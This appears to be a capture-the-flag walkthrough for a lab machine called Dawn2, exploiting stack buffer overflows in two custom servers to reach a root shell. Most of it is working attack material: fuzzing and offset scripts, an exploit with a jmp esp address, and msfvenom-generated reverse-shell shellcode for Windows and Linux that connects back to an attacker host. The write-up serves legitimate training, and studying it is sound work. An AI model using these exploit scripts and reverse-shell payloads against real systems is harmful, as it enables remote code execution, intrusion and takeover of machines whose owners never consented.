# Exploitation Guide for Dawn2
## Summary
#### This machine is running two servers, vulnerable to a stack-based buffer overflow that leads to remote code execution. One of the servers is leaked from a website and grants the attacker local privileges on the target. The second server, running as root, is then leaked from the target itself and grants the attacker a root shell when exploited.
## Enumeration

### Ports Open 80,1435,1985
``` bash
nmap -sCV -v -T4 -p- <IP> --open

NMAP RESULTS:

PORT     STATE SERVICE   VERSION
80/tcp   open  http      Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
1435/tcp open  ibm-cics?
1985/tcp open  hsrp?
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port1435-TCP:V=7.92%I=7%D=7/22%Time=62DAF784%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,4,"\r\n\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port1985-TCP:V=7.92%I=7%D=7/22%Time=62DAF784%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,4,"\r\n\r\n");
MAC Address: 08:00:27:F2:DF:36 (Oracle VirtualBox virtual NIC)

```

## Web Enumeration Port 80
Navigating to the default page on port 80 (http://192.168.55.12/) reveals a link to a custom server download: http://192.168.55.12/dawn.zip. 
We will download it and unzip the contents. Inside are two files: README.txt and dawn.exe. The README file contains the following:

```
DAWN Multi Server - Version 1.1

Important:

Due the lack of implementation of the Dawn client, many issues may be experienced, such as the message not being delivered. 
In order to make sure the connection is finished and the message well received, send a NULL-byte at the ending of your message. 
Also, the service may crash after several requests.

Sorry for the inconvenience!
```


On our machine, we examine the file, learning it is a 32 bit x86 windows executable with Little Endian

```ruby

$ file dawn.exe
dawn.exe: 
p32 executable (console) Intel 80386, for MS Windows

```

Transfer the dawn.exe file to a homelab Windows 10 vm with Immunity Debugger and mona installed.
With python server running on a kali linux machine, complete the transfer by browsing to http://10.0.2.30:8000 on the Windows vm and select download.

```ruby

┌──(root💀kali)-[/home/kali/Documents/VULN/Dawn2]
└─$ python3 -m http.server  8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.0.2.40 - - [29/Jul/2022 20:54:03] "GET / HTTP/1.1" 200 -
10.0.2.40 - - [29/Jul/2022 20:54:04] code 404, message File not found
10.0.2.40 - - [29/Jul/2022 20:54:04] "GET /favicon.ico HTTP/1.1" 404 -
10.0.2.40 - - [29/Jul/2022 20:54:32] "GET /dawn.exe HTTP/1.1" 200 -

```

## 1) Sending 500 As

#### With Immunity Debugger run as Administrator on the Windows vm, run the python script above, sending 500 byte-encoded A's and end it with a null-byte as instructed by the message we found earlier.

```python

#!/usr/bin/python3

import socket,os,sys
server = "10.0.2.40"   #homelab server with immun debugger. Computer Name: Spidey
port = 1985

As = b'A'
nullbyte = b'\x00'
payload = As * 500 + nullbyte


print(payload)

def main():
    print(len(sys.argv))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(payload)
    s.close()
    print("[+] payload sent.")
    
if __name__ == "__main__":
    main()    
    
```    

 We show we can overwrite the Execution Instruction Pointer (EIP) on the Stack with A's (41414141).  Buffer Overflow vulnerability likely exists.

![test1](https://user-images.githubusercontent.com/76034874/181864956-0bf73890-b264-4522-89e8-fc1b6e5db3cf.png)


## 2) Finding the Offset
The 2nd poc script we send will contain a unique repeating pattern of characters so we can easily find where in memory the program is crashing. Use pattern_create like this:

``` bash
┌──(root💀kali)-[/home/kali/Documents/VULN/Dawn2]
└─# msf-pattern_create -l 500                                                                          
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
```


```python

#!/usr/bin/python3

import socket,os,sys
server = "10.0.2.40"   #homelab server with immun debugger. Computer Name: Spidey
port = 1985

As = b'A'
unique = b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq'
nullbyte = b'\x00'
payload = As * 500 + unique + nullbyte


print(payload)

def main():
    print(len(sys.argv))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(payload)
    s.close()
    print("[+] payload sent.")
    
if __name__ == "__main__":
    main()    
    
```    

Immunity Debugger shows the EIP is overwritten with 316A4130, hexadecimal for 0Aj1 in ascii.` echo -e 316A4130 | xxd -r -p | rev` We can find the offset with the pattern_offset tool in mfsvenom:

![offet](https://user-images.githubusercontent.com/76034874/181865840-625f8d1e-71e0-4987-bdd6-19bd7ca81eea.png)


```bash

┌──(root💀kali)-[/home/kali/Documents/VULN/Dawn2]
└─# msf-pattern_offset -q 316a4130
[*] Exact match at offset 272
```

Put another way, the program crashes when we send 272 characters of data into the buffer. 
```bash
% echo -n 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1' |wc -c

276
```
## 3) Sending the Bs
Testing the offset calculated from above and confirming we control the EIP:
Send  A's equal to the offset, add four B's and end with a null-byte for test3:

```python
#!/usr/bin/python3

import socket,os,sys
server = "10.0.2.40"   #homelab server with immun debugger. Computer Name: Spidey
port = 1985

As = b'A'
Bs = b'B' * 4
offset = 272
nullbyte = b'\x00'
payload = As * offset + Bs + nullbyte


print(payload)

def main():
    print(len(sys.argv))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(payload)
    s.close()
    print("[+] payload sent.")
    
if __name__ == "__main__":
    main()    
```


The offset is correct because we have overwritten the EIP with B's (42424242)

![bbbb](https://user-images.githubusercontent.com/76034874/181866355-54749141-e981-4f9a-ad50-ba9b632c9e7b.png)


## 4) Sending the Cs 
Testing "is there room for evil?  Our rev shell payload will be around 400 bytes.  Can we write this much to the buffer without issue?
We will send an additional byte-string of 400 Cs, representing our payload to confirm:


```python
#!/usr/bin/python3

import socket,os,sys
server = "10.0.2.40"   #homelab server with immun debugger. Computer Name: Spidey
port = 1985

As = b'A'
Bs = b'B' * 4
Cs = b'C' * 400
offset = 272
nullbyte = b'\x00'
payload = As * offset + Bs + Cs + nullbyte
print(payload)

def main():
    print(len(sys.argv))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(payload)
    s.close()
    print("[+] payload sent.")
    
if __name__ == "__main__":
    main()    
```    

![cccc](https://user-images.githubusercontent.com/76034874/181866624-1e9edd0c-f52f-4303-92d4-49896367ae6f.png)

## 5) Testing for Bad Characters. 
#### The most common bad characters are x00,x0A,x0D, and xff due to the way the C language interprets these as 'special characters' instead of what we might intend.  We want to make sure msfvenom avoids using any we find while generating our payload, so it will run successfully.

We have a list saved and formated for python3 but they can also be found here: https://github.com/cytopia/badchars
or simply outputed to screen with this quick script:
```python
#!/usr/bin/python
import sys
for x in range(1,256):
    print('\\x{:02x}'.format(x), end = '')
```    

so this step will send our As * offset + Bs + badchars + nullbyte:

```python


#!/usr/bin/python3

import socket,os,sys
server = "10.0.2.40"  #homelab server with immun debugger. Computer Name: Spidey
port = 1985

badchars =b''
badchars+=b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
badchars+=b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
badchars+=b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
badchars+=b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
badchars+=b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
badchars+=b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
badchars+=b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
badchars+=b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
badchars+=b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
badchars+=b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
badchars+=b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
badchars+=b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
badchars+=b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
badchars+=b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
badchars+=b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
badchars+=b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

As = b'A'
Bs = b'B' * 4

offset = 272
nullbyte = b'\x00'
payload = As * offset + Bs + badchars + nullbyte


print(payload)

def main():
    print(len(sys.argv))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(payload)
    s.close()
    print("[+] payload sent.")
    
if __name__ == "__main__":
    main()    
```
We are checking that every hex value from x00-FF is in order without any errors.  To do this, right-click on the ESP and select **Follow Dump** from the menu.  Here it is good to go:


![badchar](https://user-images.githubusercontent.com/76034874/181870131-29d479b1-fb04-4e7d-a1ff-2dc5c950295c.png)

## 6) Finding the Jump Point
#### We need to find an address in memory with the jmp esp instruction with no security features in place. (False across the board).  We can use this instruction to jump the program to an area of memory we control, which is pure evil (reverse shell).  We do this with mona, a tool in Immunity Debugger.  The syntax is !mona jmp -r esp

![jmpesp](https://user-images.githubusercontent.com/76034874/181870587-18478525-0d60-4cd5-9e6b-81ed35f016b5.png)

# Generating the reverse shell
We use msfvenom.  Our test target is windows and it is an x86 binary:
msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=10.0.2.30 LPORT=4444 -f py -b '\x00' EXITFUNC=thread -v shellcode

```python

#!/usr/bin/python3

import socket,os,sys
server = "10.0.2.40"   #homelab server with immun debugger. Computer Name: Spidey
port = 1985

#msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=10.0.2.30 LPORT=4444 -f py -b '\x00' EXITFUNC=thread -v shellcode
shellcode =  b""
shellcode += b"\xdd\xc1\xd9\x74\x24\xf4\xba\x99\xdc\x3b\x2d"
shellcode += b"\x5e\x31\xc9\xb1\x52\x31\x56\x17\x83\xee\xfc"
shellcode += b"\x03\xcf\xcf\xd9\xd8\x13\x07\x9f\x23\xeb\xd8"
shellcode += b"\xc0\xaa\x0e\xe9\xc0\xc9\x5b\x5a\xf1\x9a\x09"
shellcode += b"\x57\x7a\xce\xb9\xec\x0e\xc7\xce\x45\xa4\x31"
shellcode += b"\xe1\x56\x95\x02\x60\xd5\xe4\x56\x42\xe4\x26"
shellcode += b"\xab\x83\x21\x5a\x46\xd1\xfa\x10\xf5\xc5\x8f"
shellcode += b"\x6d\xc6\x6e\xc3\x60\x4e\x93\x94\x83\x7f\x02"
shellcode += b"\xae\xdd\x5f\xa5\x63\x56\xd6\xbd\x60\x53\xa0"
shellcode += b"\x36\x52\x2f\x33\x9e\xaa\xd0\x98\xdf\x02\x23"
shellcode += b"\xe0\x18\xa4\xdc\x97\x50\xd6\x61\xa0\xa7\xa4"
shellcode += b"\xbd\x25\x33\x0e\x35\x9d\x9f\xae\x9a\x78\x54"
shellcode += b"\xbc\x57\x0e\x32\xa1\x66\xc3\x49\xdd\xe3\xe2"
shellcode += b"\x9d\x57\xb7\xc0\x39\x33\x63\x68\x18\x99\xc2"
shellcode += b"\x95\x7a\x42\xba\x33\xf1\x6f\xaf\x49\x58\xf8"
shellcode += b"\x1c\x60\x62\xf8\x0a\xf3\x11\xca\x95\xaf\xbd"
shellcode += b"\x66\x5d\x76\x3a\x88\x74\xce\xd4\x77\x77\x2f"
shellcode += b"\xfd\xb3\x23\x7f\x95\x12\x4c\x14\x65\x9a\x99"
shellcode += b"\xbb\x35\x34\x72\x7c\xe5\xf4\x22\x14\xef\xfa"
shellcode += b"\x1d\x04\x10\xd1\x35\xaf\xeb\xb2\x33\x30\xf1"
shellcode += b"\x5c\x2c\x32\xf5\x71\xf0\xbb\x13\x1b\x18\xea"
shellcode += b"\x8c\xb4\x81\xb7\x46\x24\x4d\x62\x23\x66\xc5"
shellcode += b"\x81\xd4\x29\x2e\xef\xc6\xde\xde\xba\xb4\x49"
shellcode += b"\xe0\x10\xd0\x16\x73\xff\x20\x50\x68\xa8\x77"
shellcode += b"\x35\x5e\xa1\x1d\xab\xf9\x1b\x03\x36\x9f\x64"
shellcode += b"\x87\xed\x5c\x6a\x06\x63\xd8\x48\x18\xbd\xe1"
shellcode += b"\xd4\x4c\x11\xb4\x82\x3a\xd7\x6e\x65\x94\x81"
shellcode += b"\xdd\x2f\x70\x57\x2e\xf0\x06\x58\x7b\x86\xe6"
shellcode += b"\xe9\xd2\xdf\x19\xc5\xb2\xd7\x62\x3b\x23\x17"
shellcode += b"\xb9\xff\x43\xfa\x6b\x0a\xec\xa3\xfe\xb7\x71"
shellcode += b"\x54\xd5\xf4\x8f\xd7\xdf\x84\x6b\xc7\xaa\x81"
shellcode += b"\x30\x4f\x47\xf8\x29\x3a\x67\xaf\x4a\x6f"

As = b'A'
Bs = b'B' * 4

offset = 272
nullbyte = b'\x00'
nops = b'\x90' * 16
jmp_addr = b'\xba\x64\x59\x34'
payload = As * offset + jmp_addr+ nops + shellcode + nops + nullbyte
print(payload)

def main():
    print(len(sys.argv))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(payload)
    s.close()
    print("[+] payload sent.")
    
if __name__ == "__main__":
    main()    
```

![revshell](https://user-images.githubusercontent.com/76034874/181870942-b910442c-0674-4e8b-8749-4a85c17f6adb.png)


# Exploiting our Target
## with our poc script working in our test environment, it's time to exploit our real target, the Dawn machine:
in the script, change the server to the target IP
generate shellcode using msfvenom to match the arch and OS of the target, linux and x86:
set LHOST to our tun0 and pick a LPORT:
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.49.55 LPORT=4444 -f py -b "\x00" -v shellcode

```python

#!/usr/bin/python3

import socket,os,sys
server = "192.168.55.12"   #target server 
port = 1985

shellcode =  b""
shellcode += b"\xb8\x0f\xe6\x73\xc6\xda\xc4\xd9\x74\x24\xf4"
shellcode += b"\x5f\x2b\xc9\xb1\x12\x83\xef\xfc\x31\x47\x0e"
shellcode += b"\x03\x48\xe8\x91\x33\x67\x2f\xa2\x5f\xd4\x8c"
shellcode += b"\x1e\xca\xd8\x9b\x40\xba\xba\x56\x02\x28\x1b"
shellcode += b"\xd9\x3c\x82\x1b\x50\x3a\xe5\x73\xa3\x14\x24"
shellcode += b"\xb4\x4b\x67\x47\xab\xd7\xee\xa6\x7b\x81\xa0"
shellcode += b"\x79\x28\xfd\x42\xf3\x2f\xcc\xc5\x51\xc7\xa1"
shellcode += b"\xea\x26\x7f\x56\xda\xe7\x1d\xcf\xad\x1b\xb3"
shellcode += b"\x5c\x27\x3a\x83\x68\xfa\x3d"

As = b'A'
Bs = b'B' * 4

offset = 272
nullbyte = b'\x00'
nops = b'\x90' * 16
jmp_addr = b'\xba\x64\x59\x34'
payload = As * offset + jmp_addr+ nops + shellcode + nops + nullbyte
print(payload)

def main():
    print(len(sys.argv))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(payload)
    s.close()
    print("[+] payload sent.")
    
if __name__ == "__main__":
    main()    
```

![bling](https://user-images.githubusercontent.com/76034874/181871630-b621286e-9424-49de-b801-12e18335066f.png)


## Part2 BOF
### We notice another .exe binary on the target in the 1st directory we land in.  Download it to our machine like before. We examine it to find it's the same type (32 bit x86 Little Endian Windows executable).

```bash
┌──(root💀kali)-[/home/kali/Documents/VULN/Dawn2]
└─# file dawn-BETA.exe                            
dawn-BETA.exe: PE32 executable (console) Intel 80386, for MS Windows
```
# Sending 500 As, same as before, this time to the other open port 1435:

```python

server = "192.168.55.12"  #target server
port = 1435
As = b'A' * 500
Bs = b'B' * 4
payload = As + nullbyte
---snip---
```

# Sending 500 Unique Characters

```python
unique = b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq'
```
Immunity Debugger shows the EIP is filled with 61413461.  This is really all we need to plug into pattern_offset. But what does it mean?  from bash, we can `echo -e 61413461 | xxd -r -p | rev` and see that it is the ascii sequence 'a4Aa'
![unique](https://user-images.githubusercontent.com/76034874/182207447-8fb75c95-437f-4a61-bead-ae1723f70e2a.png)



using pattern_offset, we find the offset at 13:

```bash

┌──(root💀kali)-[/home/kali/Documents/VULN/Dawn2]
└─# msf-pattern_offset -q 61413461
[*] Exact match at offset 13
```

## Bad Char Test comes up clean

![badchar](https://user-images.githubusercontent.com/76034874/181870131-29d479b1-fb04-4e7d-a1ff-2dc5c950295c.png)

## Finding the Jump Point
!mona jmp -r esp

![BETA_jmp](https://user-images.githubusercontent.com/76034874/182207148-7da1fca2-3c47-4eef-9670-89e715e53f27.png)


## reuse linux revshell code from previous step


```python

#dawn-BETA.exe linux PG target
shellcode =  b""
shellcode += b"\xb8\x18\x31\x0c\x19\xda\xce\xd9\x74\x24\xf4"
shellcode += b"\x5b\x2b\xc9\xb1\x12\x31\x43\x12\x03\x43\x12"
shellcode += b"\x83\xf3\xcd\xee\xec\x32\xf5\x18\xed\x67\x4a"
shellcode += b"\xb4\x98\x85\xc5\xdb\xed\xef\x18\x9b\x9d\xb6"
shellcode += b"\x12\xa3\x6c\xc8\x1a\xa5\x97\xa0\x5c\xfd\x59"
shellcode += b"\x07\x35\xfc\x99\x76\x99\x89\x7b\xc8\x47\xda"
shellcode += b"\x2a\x7b\x3b\xd9\x45\x9a\xf6\x5e\x07\x34\x67"
shellcode += b"\x70\xdb\xac\x1f\xa1\x34\x4e\x89\x34\xa9\xdc"
shellcode += b"\x1a\xce\xcf\x50\x97\x1d\x8f"

```


# Root

![root](https://user-images.githubusercontent.com/76034874/181872819-cce1a45a-54cd-4783-be6b-cf27ba062a62.png)

